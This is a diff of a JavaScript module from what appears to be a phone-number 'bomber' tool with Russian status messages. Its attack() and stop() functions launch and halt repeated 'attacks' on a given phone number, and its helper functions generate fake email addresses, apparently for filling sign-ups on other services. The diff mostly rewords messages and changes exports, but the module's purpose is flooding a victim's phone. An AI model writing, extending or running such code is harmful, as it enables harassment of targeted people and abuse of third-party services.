@@ -13,24 +13,28 @@ function attack(number, loop){
     if(!Number(number) || number.toString().length < 11){
             result = {
                 "success": false,
-                "text": `Указанный параментр number не является номером телефона либо вовсе не указан`
+                "text": `Номер телефона не указан либо не является корректным`
             }
         return result; 
     }
     if(!Number(loop) || !loop){
         result = {
             "success": false,
-            "text": `Указанный параментр loop не является корректным либо вовсе отсутстует`
+            "text": `Параментр loop отсутсвует либо не является корректным`
         }
         return result; 
     }else{
         result = {
             "success": true,
-            "text": `Атака на номер ${number} успешно запущена`
+            "text": `Атака на номер +${number} успешно запущена`
         }
     count = 0;
 
-    list_attacks.push({number: number, loop: loop, startedAt: Date.now()})
+    list_attacks.push({
+        number: Number(number),
+        loop: Number(loop),
+        startedAt: Date.now()
+    })
     
     service.start(number);
 
@@ -59,13 +63,13 @@ function stop(number){
         clearInterval(current_attacks[number])
     result = {
         success: true,
-        text: `Атака на номер ${number} успешно прекращена`
+        text: `Атака на номер +${number} успешно прекращена`
     }
     return result
     }else{
         result = {
             success: false,
-            text: `Нет активных атак по номеру ${number}`
+            text: `Нет активных атак по номеру +${number}`
         }
     return result
     }
@@ -90,14 +94,14 @@ function list(){
     }
 }
 
-module.exports.mailGen = function(){
+function mailGen(){
     let domains = ['@mail.ru', '@yandex.ru', '@gmail.com', '@rambler.ru']
     let fakelogin = Math.random().toString(36).substr(5, 9)
     let result = fakelogin + getRandomElement(domains)
     return result
 }
 
-module.exports.charsGen = function(){
+function charsGen(){
     let result = Math.random().toString(36).substr(5, 9)
     return result
 }
@@ -111,4 +115,4 @@ function getRandomElement(arr) {
     return arr[rand];
 }
 
-module.exports = { list_attacks, current_attacks, attack, stop, list}
+module.exports = { list_attacks, current_attacks, attack, stop, list, charsGen, mailGen}
